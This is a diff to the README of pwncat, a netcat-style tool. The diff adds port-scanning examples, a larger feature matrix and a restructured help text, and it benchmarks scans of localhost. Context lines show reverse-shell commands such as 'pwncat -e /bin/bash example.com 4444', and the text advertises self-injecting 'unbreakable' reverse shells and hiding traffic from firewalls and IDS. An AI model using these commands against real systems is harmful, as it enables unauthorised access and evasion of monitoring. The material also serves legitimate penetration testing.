@@ -134,7 +134,7 @@
  </tbody>
 <table>
 
-> <sup>[1] <a href="https://cytopia.github.io/pwncat/pwncat.type.html">mypy type coverage</a> <strong>(fully typed: 94.37%)</strong></sup><br/>
+> <sup>[1] <a href="https://cytopia.github.io/pwncat/pwncat.type.html">mypy type coverage</a> <strong>(fully typed: 93.52%)</strong></sup><br/>
 > <sup>[2] Linux builds are currently only failing, due to loss of IPv6 support: <a href="https://github.com/actions/virtual-environments/issues/929">Issue</a></sup><br/>
 > <sup>[3] Windows builds are currently only failing, because they are simply stuck on GitHub actions: <a href="https://github.com/actions/virtual-environments/issues/917">Issue</a></sup>
 
@@ -211,6 +211,26 @@ pwncat -e '/bin/bash' example.com 4444 --reconn --recon-wait 1
 pwncat -e '/bin/bash' example.com 4444 -u --ping-intvl 1
 ```
 
+### Port scan
+```bash
+# [TCP] IPv4 + IPv6
+pwncat -z 10.0.0.1 80,443,8080
+pwncat -z 10.0.0.1 1-65535
+pwncat -z 10.0.0.1 1+1023
+
+# [UDP] IPv4 + IPv6
+pwncat -z 10.0.0.1 80,443,8080 -u
+pwncat -z 10.0.0.1 1-65535 -u
+pwncat -z 10.0.0.1 1+1023 -u
+
+# Use only IPv6 or IPv4
+pwncat -z 10.0.0.1 1-65535 -4
+pwncat -z 10.0.0.1 1-65535 -6 -u
+
+# Add version detection
+pwncat -z 10.0.0.1 1-65535 --banner
+```
+
 ### Local port forward `-L` (listening proxy)
 ```bash
 # Make remote MySQL server (remote port 3306) available on current machine
@@ -246,6 +266,7 @@ pwncat -R 10.0.0.1:4444 everythingcli.org 3306 -u
 | Feature        | Description |
 |----------------|-------------|
 | [PSE](pse)        | Fully scriptable with Pwncat Scripting Engine to allow all kinds of fancy stuff on send and receive |
+| port scanning  | TCP und UDP port scanning with basic version detection support |
 | Self-injecting rshell | Self-injecting mode to deploy itself and start an unbreakable reverse shell back to you automatically |
 | Bind shell        | Create bind shells |
 | Reverse shell     | Create reverse shells |
@@ -260,44 +281,51 @@ pwncat -R 10.0.0.1:4444 everythingcli.org 3306 -u
 | IPv4 / IPv6       | Dual or single stack IPv4 and IPv6 support |
 | Python 2+3        | Works with Python 2, Python 3, pypy2 and pypy3 |
 | Cross OS          | Work on Linux, MacOS and Windows as long as Python is available |
-| Compatability     | Use the traditional `netcat` as a client or server together with `pwncat` |
+| Compatability     | Use the `netcat`, `ncat` or `socat` as a client or server together with `pwncat` |
 | Portable          | Single file which only uses core packages - no external dependencies required. |
 
 
 ### Feature comparison matrix
 
-|                     | pwncat | netcat | ncat |
-|---------------------|--------|---------|-----|
-| Scripting engine    | Python | :x:     | Lua |
-| Self-injecting      | ✔      | :x:     | :x: |
-| IP ToS              | ✔      | ✔       | :x: |
-| IPv4                | ✔      | ✔       | ✔   |
-| IPv6                | ✔      | ✔       | ✔   |
-| Unix domain sockets | :x:    | ✔       | ✔   |
-| Socket source bind  | ✔      | ✔       | ✔   |
-| TCP                 | ✔      | ✔       | ✔   |
-| UDP                 | ✔      | ✔       | ✔   |
-| SCTP                | :x:    | :x:     | ✔   |
-| Command exec        | ✔      | ✔       | ✔   |
-| Inbound port scan   | *      | ✔       | ✔   |
-| Outbound port scan  | ✔      | :x:     | :x: |
-| Hex dump            | *      | ✔       | ✔   |
-| Telnet              | :x:    | ✔       | ✔   |
-| SSL                 | :x:    | :x:     | ✔   |
-| HTTP                | *      | :x:     | :x: |
-| HTTPS               | *      | :x:     | :x: |
-| Chat                | ✔      | ✔       | ✔   |
-| Broker              | :x:    | :x:     | ✔   |
-| Simultaneous conns  | :x:    | :x:     | ✔   |
-| Allow/deny          | :x:    | :x:     | ✔   |
-| Local port forward  | ✔      | :x:     | :x: |
-| Remote port forward | ✔      | :x:     | :x: |
-| Re-accept           | ✔      | ✔       | ✔   |
-| Proxy               | :x:    | ✔       | ✔   |
-| UDP reverse shell   | ✔      | :x:     | :x: |
-| Respawning client   | ✔      | :x:     | :x: |
-| Port hopping        | ✔      | :x:     | :x: |
-| Emergency shutdown  | ✔      | :x:     | :x: |
+|                     | pwncat   | netcat | ncat  | socat |
+|---------------------|----------|--------|-------|-------|
+| Scripting engine    | ✔ Python | :x:    | ✔ Lua | :x:   |
+|                     |          |        |       |       |
+| IP ToS              | ✔        | ✔      | :x:   | ✔     |
+| IPv4                | ✔        | ✔      | ✔     | ✔     |
+| IPv6                | ✔        | ✔      | ✔     | ✔     |
+| Unix domain sockets | :x:      | ✔      | ✔     | ✔     |
+| Linux vsock         | :x:      | :x:    | ✔     | :x:   |
+| Socket source bind  | ✔        | ✔      | ✔     | ✔     |
+|                     |          |        |       |       |
+| TCP                 | ✔        | ✔      | ✔     | ✔     |
+| UDP                 | ✔        | ✔      | ✔     | ✔     |
+| SCTP                | :x:      | :x:    | ✔     | ✔     |
+| SSL                 | :x:      | :x:    | ✔     | ✔     |
+| HTTP                | *        | :x:    | :x:   | :x:   |
+| HTTPS               | *        | :x:    | :x:   | :x:   |
+|                     |          |        |       |       |
+| Telnet negotiation  | :x:      | ✔      | ✔     | :x:   |
+| Proxy support       | :x:      | ✔      | ✔     | ✔     |
+| Local port forward  | ✔        | :x:    | :x:   | ✔     |
+| Remote port forward | ✔        | :x:    | :x:   | :x:   |
+|                     |          |        |       |       |
+| Inbound port scan   | ✔        | ✔      | ✔     | :x:   |
+| Outbound port scan  | ✔        | :x:    | :x:   | :x:   |
+| Version detection   | ✔        | :x:    | :x:   | :x:   |
+|                     |          |        |       |       |
+| Chat                | ✔        | ✔      | ✔     | ✔     |
+| Command execution   | ✔        | ✔      | ✔     | ✔     |
+| Hex dump            | *        | ✔      | ✔     | ✔     |
+| Broker              | :x:      | :x:    | ✔     | :x:   |
+| Simultaneous conns  | :x:      | :x:    | ✔     | ✔     |
+| Allow/deny          | :x:      | :x:    | ✔     | ✔     |
+| Re-accept           | ✔        | ✔      | ✔     | ✔     |
+| Self-injecting      | ✔        | :x:    | :x:   | :x:   |
+| UDP reverse shell   | ✔        | :x:    | :x:   | :x:   |
+| Respawning client   | ✔        | :x:    | :x:   | :x:   |
+| Port hopping        | ✔        | :x:    | :x:   | :x:   |
+| Emergency shutdown  | ✔        | :x:    | :x:   | :x:   |
 
 > <sup>`*` Feature is currently under development.
 
@@ -361,11 +389,11 @@ Type `pwncat -h` or click below to see all available options.
   <summary><strong>Click here to expand usage</strong></summary>
 
 ```
-usage: pwncat [-Cnuv] [-e cmd] hostname port
-       pwncat [-Cnuv] [-e cmd] -l [hostname] port
-       pwncat [-Cnuv] -z hostname port
-       pwncat [-Cnuv] -L [addr:]port hostname port
-       pwncat [-Cnuv] -R addr:port hostname port
+usage: pwncat [options] hostname port
+       pwncat [options] -l [hostname] port
+       pwncat [options] -z hostname port
+       pwncat [options] -L [addr:]port hostname port
+       pwncat [options] -R addr:port hostname port
        pwncat -V, --version
        pwncat -h, --help
 
@@ -376,12 +404,19 @@ firewalls and intrusion detection/prevention systems.
 
 If no mode arguments are specified, pwncat will run in connect mode and act as
 a client to connect to a remote endpoint. If the connection to the remote
-endoint is lost, pwncat will quit. See advanced options for how to automatically
-reconnect.
+endoint is lost, pwncat will quit. See options for how to automatically re-
+connect.
 
 positional arguments:
-  hostname              Address to listen, forward or connect to
-  port                  Port to listen, forward or connect to
+  hostname              Address to listen, forward, scan or connect to.
+
+  port                  [All modes]
+                        Single port to listen, forward or connect to.
+                        [Zero-I/O mode]
+                        Specify multiple ports to scan:
+                        Via list:  4444,4445,4446
+                        Via range: 4444-4446
+                        Via incr:  4444+2
 
 mode arguments:
   -l, --listen          [Listen mode]:
@@ -393,6 +428,7 @@ mode arguments:
   -z, --zero            [Zero-I/0 mode]:
                         Connect to a remote endpoint and report status only.
                         Used for port scanning.
+                        See --banner for version detection.
 
   -L [addr:]port, --local [addr:]port
                         [Local forward mode]:
@@ -418,35 +454,60 @@ mode arguments:
                         target machine via the positional arguments.
 
 optional arguments:
-  -4                    Only Use IPv4 instead of both, IPv4 and IPv6.
-  -6                    Only Use IPv6 instead of both, IPv4 and IPv6.
   -e cmd, --exec cmd    Execute shell command. Only for connect or listen mode.
+
   -C lf, --crlf lf      Specify, 'lf', 'crlf' or 'cr' to always force replacing
                         line endings for input and outout accordingly. Specify
                         'no' to completely remove any line feeds. By default
                         it will not replace anything and takes what is entered
                         (usually CRLF on Windows, LF on Linux and some times
                         CR on MacOS).
+
   -n, --nodns           Do not resolve DNS.
-  -u, --udp             Use UDP for the connection instead of TCP.
-  -T str, --tos str     Specifies IP Type of Service (ToS) for the connection.
-                        Valid values are the tokens 'mincost', 'lowcost',
-                        'reliability', 'throughput' or 'lowdelay'.
-  --source-addr addr    Specify the source IP address of the interface for connect mode.
-  --source-port port    Specify the source port for connect mode.
+
   -v, --verbose         Be verbose and print info to stderr. Use -v, -vv, -vvv
                         or -vvvv for more verbosity. The server performance will
                         decrease drastically if you use more than three times.
-  --info type           Show additional info about sockets, ip4/6 or tcp opts
+
+  --info type           Show additional info about sockets, IPv4/6 or TCP opts
                         applied to the current socket connection. Valid
                         parameter are 'sock', 'ipv4', 'ipv6', 'tcp' or 'all'.
                         Note, you must at least be in INFO verbose mode in order
                         to see them (-vv).
+
   -c str, --color str   Colored log output. Specify 'always', 'never' or 'auto'.
                         In 'auto' mode, color is displayed as long as the output
                         goes to a terminal. If it is piped into a file, color
                         will automatically be disabled. This mode also disables
                         color on Windows by default. (default: auto)
+
+  --safe-word str       All modes:
+                        If pwncat is started with this argument, it will shut
+                        down as soon as it receives the specified string. The
+                        --keep-open (server) or --reconn (client) options will
+                        be ignored and it won't listen again or reconnect to you.
+                        Use a very unique string to not have it shut down
+                        accidentally by other input.
+
+protocol arguments:
+  -4                    Only Use IPv4 (default: IPv4 and IPv6 dualstack).
+
+  -6                    Only Use IPv6 (default: IPv4 and IPv6 dualstack).
+
+  -u, --udp             Use UDP for the connection instead of TCP.
+
+  -T str, --tos str     Specifies IP Type of Service (ToS) for the connection.
+                        Valid values are the tokens 'mincost', 'lowcost',
+                        'reliability', 'throughput' or 'lowdelay'.
+
+  --http                Connect / Listen mode (TCP and UDP):
+                        Hide traffic in http packets to fool Firewalls/IDS/IPS.
+
+  --https               Connect / Listen mode (TCP and UDP):
+                        Hide traffic in https packets to fool Firewalls/IDS/IPS.
+
+  -H [str [str ...]], --header [str [str ...]]
+                        Add HTTP headers to your request when using --http(s).
 
 command & control arguments:
   --self-inject cmd:host:port[s]
@@ -467,7 +528,7 @@ command & control arguments:
                         Note: this is currently an experimental feature and does
                         not work on Windows remote hosts yet.
 
-advanced arguments:
+pwncat scripting engine:
   --script-send file    All modes (TCP and UDP):
                         A Python scripting engine to define your own custom
                         transformer function which will be executed before
@@ -502,12 +563,11 @@ advanced arguments:
                         not collide with pwncat's function or classes, as the
                         file will be called with exec().
 
-  --http                Connect / Listen / Local forward mode (TCP only):
-                        Hide traffic in http packets to fool Firewalls/IDS/IPS.
+zero-i/o mode arguments:
+  --banner              Zero-I/O (TCP and UDP):
+                        Try banner grabbing during port scan.
 
-  --https               Connect / Listen / Local forward mode (TCP only):
-                        Hide traffic in https packets to fool Firewalls/IDS/IPS.
-
+listen mode arguments:
   -k, --keep-open       Listen mode (TCP only):
                         Re-accept new clients in listen mode after a client has
                         disconnected or the connection is unterrupted otherwise.
@@ -533,7 +593,12 @@ advanced arguments:
                         Set --rebind to at least the number of ports to probe +1
                         This option requires --rebind to be specified.
 
-  --reconn [x]          Connect mode / Zero-I/O mode (TCP only):
+connect mode arguments:
+  --source-addr addr    Specify source bind IP address for connect mode.
+
+  --source-port port    Specify source bind port for connect mode.
+
+  --reconn [x]          Connect mode (TCP and UDP):
                         If the remote server is not reachable or the connection
                         is interrupted, the client will connect again x many
                         times before giving up. Omit the quantifier to retry
@@ -542,11 +607,16 @@ advanced arguments:
                         (default: quit if the remote is not available or the
                         connection was interrupted)
                         This might be handy for stable TCP reverse shells ;-)
+                        Note on UDP:
+                        By default UDP does not know if it is connected, so
+                        it will stop at the first port and assume it has a
+                        connection. Consider using --udp-sconnect with this
+                        option to make UDP aware of a successful connection.
 
-  --reconn-wait s       Connect mode / Zero-I/O mode (TCP only):
+  --reconn-wait s       Connect mode (TCP and UDP):
                         Wait x seconds between re-connects. (default: 1)
 
-  --reconn-robin port   Connect mode / Zero-I/O mode (TCP only):
+  --reconn-robin port   Connect mode (TCP and UDP):
                         If the remote server is not reachable or the connection
                         is interrupted and --reconn is specified, the client
                         will shuffle ports in round-robin mode to connect to.
@@ -559,14 +629,7 @@ advanced arguments:
                         This is also useful in Connect or Zero-I/O mode to
                         figure out what outbound ports are allowed.
 
-  -w s, --wait s        Connect mode (TCP only):
-                        If a connection and stdin are idle for more than s sec,
-                        then the connection is silently closed and the client
-                        will exit. (default: wait forever).
-                        Note: if --reconn is specified, the connection will be
-                        re-opened.
-
-  --ping-init           Connect mode / Zero-I/O mode (TCP and UDP):
+  --ping-init           Connect mode (TCP and UDP):
                         UDP is a stateless protocol unlike TCP, so no hand-
                         shake communication takes place and the client just
                         sends data to a server without being "accepted" by
@@ -579,11 +642,11 @@ advanced arguments:
                         The --ping-init option instructs the client to send one
                         single initial ping packet to the server, so that it is
                         able to talk to the client.
-                        This is the only way to make a UDP reverse shell work.
+                        This is a way to make a UDP reverse shell work.
                         See --ping-word for what char/string to send as initial
                         ping packet (default: '\0')
 
-  --ping-intvl s        Connect mode / Zero-I/O mode (TCP and UDP):
+  --ping-intvl s        Connect mode (TCP and UDP):
                         Instruct the client to send ping intervalls every s sec.
                         This allows you to restart your UDP server and just wait
                         for the client to report back in. This might be handy
@@ -591,11 +654,11 @@ advanced arguments:
                         See --ping-word for what char/string to send as initial
                         ping packet (default: '\0')
 
-  --ping-word str       Connect mode / Zero-I/O mode (TCP and UDP):
+  --ping-word str       Connect mode (TCP and UDP):
                         Change the default character '\0' to use for upd ping.
                         Single character or strings are supported.
 
-  --ping-robin port     Connect mode / Zero-I/O mode (TCP and UDP):
+  --ping-robin port     Connect mode (TCP and UDP):
                         Instruct the client to shuffle the specified ports in
                         round-robin mode for a remote server to ping.
                         This might be handy to scan outbound allowed ports.
@@ -603,13 +666,23 @@ advanced arguments:
                         of ports '80-83' or an increment '80+3'.
                         Use --ping-intvl 0 to be faster.
 
-  --safe-word str       All modes:
-                        If pwncat is started with this argument, it will shut
-                        down as soon as it receives the specified string. The
-                        --keep-open (server) or --reconn (client) options will
-                        be ignored and it won't listen again or reconnect to you.
-                        Use a very unique string to not have it shut down
-                        accidentally by other input.
+  --udp-sconnect        Connect mode (UDP only):
+                        Emulating stateful behaviour for UDP connect phase by
+                        sending an initial packet to the server to validate if
+                        it is actually connected.
+                        By default, UDP will simply issue a connect and is not
+                        aware if it is really connected or not.
+                        The default connect packet to be send is '\0', you
+                        can change this with --udp-sconnect-word.
+
+  --udp-sconnect-word [str]
+                        Connect mode (UDP only):
+                        Change the the data to be send for UDP stateful connect
+                        behaviour. Note you can also omit the string to send an
+                        empty packet (EOF), but be aware that some servers such
+                        as netcat will instantly quit upon receive of an EOF
+                        packet.
+                        The default is to send a null byte sting: '\0'.
 
 misc arguments:
   -h, --help            Show this help message and exit
@@ -1120,6 +1193,91 @@ pwncat -vvvv -l localhost 4444 \
 pwncat -vvvv localhost 4444 \
   --script-send pse/http-post/pse-http_post-pack.py \
   --script-recv pse/http-post/pse-http_post-unpack.py
+```
+
+### Port scanning
+
+#### TCP
+```bash
+$ sudo netstat -tlpn
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address     State
+tcp        0      0 127.0.0.1:631           0.0.0.0:*           LISTEN
+tcp        0      0 127.0.0.1:25            0.0.0.0:*           LISTEN
+tcp        0      0 127.0.0.1:4444          0.0.0.0:*           LISTEN
+tcp        0      0 0.0.0.0:902             0.0.0.0:*           LISTEN
+tcp6       0      0 ::1:631                 :::*                LISTEN
+tcp6       0      0 ::1:25                  :::*                LISTEN
+tcp6       0      0 ::1:4444                :::*                LISTEN
+tcp6       0      0 :::1053                 :::*                LISTEN
+tcp6       0      0 :::902                  :::*                LISTEN
+```
+
+#### UDP
+The following UDP ports are exposing:
+```bash
+$ sudo netstat -ulpn
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address
+udp        0      0 0.0.0.0:631             0.0.0.0:*
+udp        0      0 0.0.0.0:5353            0.0.0.0:*
+udp        0      0 0.0.0.0:39856           0.0.0.0:*
+udp        0      0 0.0.0.0:68              0.0.0.0:*
+udp        0      0 0.0.0.0:68              0.0.0.0:*
+udp6       0      0 :::1053                 :::*
+udp6       0      0 :::5353                 :::*
+udp6       0      0 :::57728                :::*
+```
+
+##### nmap
+```bash
+$ time sudo nmap -T5 localhost --version-intensity 0 -p- -sU
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-05-24 17:03 CEST
+Warning: 127.0.0.1 giving up on port because retransmission cap hit (2).
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000035s latency).
+Other addresses for localhost (not scanned): ::1
+Not shown: 65529 closed ports
+PORT      STATE         SERVICE
+68/udp    open|filtered dhcpc
+631/udp   open|filtered ipp
+1053/udp  open|filtered remote-as
+5353/udp  open|filtered zeroconf
+39856/udp open|filtered unknown
+40488/udp open|filtered unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 179.15 seconds
+
+real    2m52.446s
+user    0m0.844s
+sys     0m2.571s
+```
+##### netcat
+```bash
+$ time nc  -z localhost 1-65535  -u -4 -v
+Connection to localhost 68 port [udp/bootpc] succeeded!
+Connection to localhost 631 port [udp/ipp] succeeded!
+Connection to localhost 1053 port [udp/*] succeeded!
+Connection to localhost 5353 port [udp/mdns] succeeded!
+Connection to localhost 39856 port [udp/*] succeeded!
+
+real    0m18.734s
+user    0m1.004s
+sys     0m2.634s
+```
+##### pwncat
+```bash
+$ time pwncat -z localhost 1-65535 -u -4
+Scanning 65535 ports
+[+]    68/UDP open   (IPv4)
+[+]   631/UDP open   (IPv4)
+[+]  1053/UDP open   (IPv4)
+[+]  5353/UDP open   (IPv4)
+[+] 39856/UDP open   (IPv4)
+
+real    0m7.309s
+user    0m6.465s
+sys     0m4.794s
 ```
 
 
